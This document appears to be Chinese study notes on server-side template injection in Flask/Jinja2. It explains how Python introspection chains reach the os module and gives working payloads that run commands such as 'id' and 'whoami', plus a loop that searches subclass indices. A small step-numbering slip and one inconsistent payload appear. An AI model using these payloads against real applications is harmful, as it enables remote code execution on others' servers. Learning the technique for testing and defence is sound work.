## 一、SSTI 攻击链核心图谱
```text
起点 → 中间跳板 → 目标模块 → 执行操作
```
## 二、具体关系链条
### 链条1：类继承探索链（最常用）
```text
''.__class__           → 获取字符串类
     ↓
.__bases__[0]          → 获取父类(object)
     ↓  
.__subclasses__()      → 获取所有子类列表
     ↓
[i]                    → 选择第i个子类
     ↓
.__init__              → 获取初始化方法
     ↓
.__globals__           → 获取模块全局变量
     ↓  
['os']                 → 访问os模块
     ↓
.popen('命令').read()   → 执行系统命令
```
### 链条2：直接函数调用链
```text
config                 → Flask配置对象
     ↓
.__class__             → 获取类
     ↓
.__init__              → 初始化方法
     ↓
.__globals__           → 模块全局变量
     ↓
['os']                 → os模块
     ↓
.popen('命令').read()   → 执行命令
```
## 三、核心组件解析
### 1. **起点对象**（从哪里开始）
```text
''.__class__           # 空字符串的类
config                 # Flask配置对象  
request                # 请求对象
url_for               # URL生成函数
```
### 2. **类探索方法**（如何导航）
```text
.__class__             # 获取对象的类
.__bases__             # 获取父类列表
.__bases__[0]          # 获取第一个父类
.__subclasses__()      # 获取所有子类
.__mro__               # 方法解析顺序
.__mro__[1]            # 通常索引1是object类
```
### 3. **模块访问方法**（如何找到os模块）
```text
.__init__              # 类的初始化方法
.__init__.__globals__  # 初始化方法的全局变量
.__globals__           # 函数的全局变量
```
### 4. **命令执行方法**（最终目标）
```text
os.popen('命令').read()           # 执行命令并读取输出
__import__('os').popen().read()  # 动态导入后执行
__builtins__['eval']()           # 执行Python代码
```
## 四、完整的攻击链条示例
### 链条A：通过字符串到命令执行
```text
{{ ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['os'].popen('whoami').read() }}
```
**分解：**
1. `''.__class__` → `<class 'str'>`
2. `.__bases__[0]` → `<class 'object'>`
3. `.__subclasses__()[117]` → 第118个子类
4. `.__init__.__globals__` → 该类的全局变量
5. `['os']` → os模块
6. `.popen().read()` → 执行命令
### 链条B：通过Flask对象到命令执行
```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
**分解：**
1. `config` → Flask配置对象
2. `.__class__` → 获取类
3. `.__init__.__globals__` → 全局变量
4. `['os']` → os模块
5. `.popen().read()` → 执行命令
## 五、关键前提条件
### 必须按顺序访问：
```text
1. 先有对象 → 2. 再找类 → 3. 再找父类 → 4. 再找子类
    ↓
2. 选择子类 → 6. 访问初始化 → 7. 访问全局变量 → 8. 找目标模块
```
### 不能跳步：
```text
# ❌ 错误：直接从字符串找子类
''.__subclasses__()  # 错误！

# ✅ 正确：先获取类，再找父类，再找子类
''.__class__.__bases__[0].__subclasses__()
```
## 六、实用的搜索模式
### 模式1：查找包含os模块的类
```jinja2
{% for i in range(200) %}
  {% set cls = ''.__class__.__bases__[0].__subclasses__()[i] %}
  {% if cls.__init__ and cls.__init__.__globals__ %}
    {% if 'os' in cls.__init__.__globals__ %}
      找到: 索引{{ i }} - {{ cls.__name__ }}
    {% endif %}
  {% endif %}
{% endfor %}
```
### 模式2：直接利用已知索引
```jinja2
# 如果知道索引117有效
{{ ''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('命令').read() }}
```
## 七、总结记忆口诀
```text
"对象取类，类找爸爸，
爸爸孩子多，选个有用的，
孩子要初始化，初始化有全局，
全局找os，os执行命令。"
```

补充
```python
# 我们平时理解的变量
x = 10
name = "张三"

# 但 __globals__ 是函数所在模块的整个命名空间
def my_function():
    pass

print(my_function.__globals__)
# 输出：模块中所有的：变量、函数、类、导入的模块等
__init__ 是一个函数
    ↓
这个函数有 __globals__ 属性
    ↓
__globals__ 记录了该函数被定义时的模块环境
```